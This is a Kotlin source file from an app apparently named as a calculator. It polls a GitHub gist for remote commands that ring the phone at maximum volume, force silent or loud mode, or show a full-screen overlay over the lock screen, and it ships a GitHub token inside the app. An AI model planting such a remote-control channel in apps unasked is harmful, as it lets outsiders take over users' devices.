package com.android.mycalculator

import android.content.Context
import android.database.ContentObserver
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object RemoteControlHelper {
    private val COMMAND_GIST_ID = BuildConfig.COMMAND_GIST_ID
    private val GITHUB_TOKEN = BuildConfig.GITHUB_TOKEN

    private var mediaPlayer: MediaPlayer? = null
    private var vibrator: Vibrator? = null
    private var isRinging = false
    private var volumeObserver: ContentObserver? = null

    suspend fun checkAndExecuteCommand(context: Context) {
        withContext(Dispatchers.IO) {
            try {
                val getUrl = URL("https://api.github.com/gists/$COMMAND_GIST_ID")
                val getConn = getUrl.openConnection() as HttpURLConnection
                getConn.connectTimeout = 10000
                getConn.readTimeout = 10000
                getConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
                getConn.setRequestProperty("Accept", "application/vnd.github.v3+json")

                if (getConn.responseCode == 200) {
                    val responseStr = BufferedReader(InputStreamReader(getConn.inputStream)).use { it.readText() }
                    val jsonResponse = JSONObject(responseStr)
                    val files = jsonResponse.getJSONObject("files")
                    
                    if (files.has("command.txt")) {
                        val rawContent = files.getJSONObject("command.txt").getString("content").trim()
                        
                        if (rawContent.uppercase() == "IDLE") {
                            getConn.disconnect()
                            return@withContext
                        }

                        val localDeviceName = "${Build.MANUFACTURER} ${Build.MODEL}".trim()

                        val parts = rawContent.split(":", limit = 2)
                        
                        if (parts.size == 2) {
                            val targetDevice = parts[0].trim()
                            val commandString = parts[1].trim()
                            val commandUpper = commandString.uppercase()

                            if (targetDevice.equals(localDeviceName, ignoreCase = true)) {
                                
                                if (commandUpper.startsWith("MESSAGE:")) {
                                    val messageText = commandString.substring(8).trim()
                                    showMessageOverlay(context, messageText)
                                    // NOTE: We DO NOT reset the Gist here anymore.
                                    // It resets when the user clicks CLOSE.
                                } else {
                                    when (commandUpper) {
                                        "RING" -> {
                                            startRinging(context)
                                            resetCommandGist()
                                        }
                                        "SILENT" -> {
                                            forceSilentMode(context)
                                            resetCommandGist()
                                        }
                                        "GENERAL" -> {
                                            forceGeneralMode(context)
                                            resetCommandGist()
                                        }
                                    }
                                }
                            } else {
                                Log.d("RemoteControl", "Command meant for $targetDevice, ignoring on $localDeviceName")
                            }
                        }
                    }
                }
                getConn.disconnect()
            } catch (e: Exception) {
                Log.e("RemoteControl", "Failed to check command", e)
            }
        }
    }

    private fun showMessageOverlay(context: Context, message: String) {
        Handler(Looper.getMainLooper()).post {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
                return@post
            }

            // Play notification tone immediately
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                val r = RingtoneManager.getRingtone(context, uri)
                r.play()
            } catch (e: Exception) {
                Log.e("RemoteControl", "Failed to play tone", e)
            }

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            val overlayLayout = LinearLayout(context).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(Color.parseColor("#FF000000")) // 100% Solid Black
                gravity = Gravity.CENTER
                setPadding(60, 60, 60, 60)
                
                // Force true immersive mode to hide status bar and navigation buttons
                @Suppress("DEPRECATION")
                systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_FULLSCREEN)
            }

            val messageView = TextView(context).apply {
                text = message
                setTextColor(Color.WHITE)
                textSize = 36f // Made text much bigger
                setTypeface(null, Typeface.BOLD) // Made text bold
                gravity = Gravity.CENTER
                setPadding(0, 0, 0, 100) 
            }

            val closeButton = Button(context).apply {
                text = "CLOSE MESSAGE"
                setBackgroundColor(Color.parseColor("#333333"))
                setTextColor(Color.WHITE)
                textSize = 20f
                setPadding(60, 30, 60, 30)
                
                setOnClickListener {
                    try {
                        windowManager.removeView(overlayLayout)
                        
                        // Rewrite Gist to IDLE in the background AFTER closing
                        CoroutineScope(Dispatchers.IO).launch {
                            resetCommandGist()
                        }
                    } catch (e: Exception) {}
                }
            }

            overlayLayout.addView(messageView)
            overlayLayout.addView(closeButton)

            val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }
            @Suppress("DEPRECATION")
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or // Draws over status bar area
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,   // Removes screen boundaries
                PixelFormat.TRANSLUCENT
            )

            try {
                windowManager.addView(overlayLayout, params)
            } catch (e: Exception) {
                Log.e("RemoteControl", "Failed to add overlay", e)
            }
        }
    }

    private fun forceSilentMode(context: Context) {
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        
        if (notificationManager.isNotificationPolicyAccessGranted) {
            try { audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT } catch (e: Exception) {}
        }
        
        try {
            val streamsToMute = intArrayOf(
                AudioManager.STREAM_RING, AudioManager.STREAM_NOTIFICATION,
                AudioManager.STREAM_SYSTEM, AudioManager.STREAM_MUSIC
            )
            for (stream in streamsToMute) { audioManager.setStreamVolume(stream, 0, 0) }
        } catch (e: Exception) {}
    }

    private fun forceGeneralMode(context: Context) {
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager

        if (notificationManager.isNotificationPolicyAccessGranted) {
            try { audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (e: Exception) {}
        }
        
        try {
            val streamsToRestore = intArrayOf(
                AudioManager.STREAM_RING, AudioManager.STREAM_NOTIFICATION,
                AudioManager.STREAM_SYSTEM, AudioManager.STREAM_MUSIC 
            )
            for (stream in streamsToRestore) {
                val maxVol = audioManager.getStreamMaxVolume(stream)
                audioManager.setStreamVolume(stream, maxVol, 0)
            }
        } catch (e: Exception) {}
    }

    private fun startRinging(context: Context) {
        if (isRinging) return
        isRinging = true

        forceGeneralMode(context)

        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val maxAlarmVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxAlarmVolume, 0)
        @Suppress("DEPRECATION")
        vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        val pattern = longArrayOf(0, 1000, 1000) 
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator?.vibrate(VibrationEffect.createWaveform(pattern, 0)) 
        } else {
            @Suppress("DEPRECATION")
            vibrator?.vibrate(pattern, 0)
        }

        val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)

        mediaPlayer = MediaPlayer().apply {
            setDataSource(context, alarmUri)
            setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_ALARM).setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION).build())
            isLooping = true
            prepare()
            start()
        }

        volumeObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                stopRinging(context)
            }
        }
        context.contentResolver.registerContentObserver(android.provider.Settings.System.CONTENT_URI, true, volumeObserver!!)
    }

    fun stopRinging(context: Context) {
        if (!isRinging) return
        try { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null } catch (e: Exception) {}
        try { vibrator?.cancel(); vibrator = null } catch (e: Exception) {}
        if (volumeObserver != null) {
            context.contentResolver.unregisterContentObserver(volumeObserver!!)
            volumeObserver = null
        }
        isRinging = false
    }

    private fun resetCommandGist() {
        try {
            val patchUrl = URL("https://api.github.com/gists/$COMMAND_GIST_ID")
            val patchConn = patchUrl.openConnection() as HttpURLConnection
            patchConn.requestMethod = "PATCH"
            patchConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            patchConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
            patchConn.setRequestProperty("Content-Type", "application/json")
            patchConn.doOutput = true

            val payload = """{"files": {"command.txt": {"content": "IDLE"}}}"""
            OutputStreamWriter(patchConn.outputStream).use { it.write(payload) }
            patchConn.responseCode 
            patchConn.disconnect()
        } catch (e: Exception) {
            Log.e("RemoteControl", "Failed to reset Gist", e)
        }
    }
}
